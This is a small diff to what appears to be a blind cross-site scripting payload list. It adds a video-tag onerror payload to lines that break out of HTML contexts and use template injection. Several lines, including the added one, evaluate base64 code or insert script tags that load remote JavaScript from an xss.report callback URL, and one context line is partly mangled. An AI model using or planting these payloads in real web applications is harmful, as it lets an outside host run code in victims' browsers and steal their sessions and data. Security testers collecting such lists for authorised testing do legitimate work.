@@ -99,3 +99,4 @@ javascript://</script></textarea></style></noscript></noembed></script></templat
 "><iframesrcdoc="<script>v#116;tps://https://xss.report/c/hnterx?98";ument.>">
 {{constructor.constructor('eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD85OTsiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7\'))')()}}
 <="" script=""><script src="//xss.report/c/hnterx?100"></script>
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8xMDMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
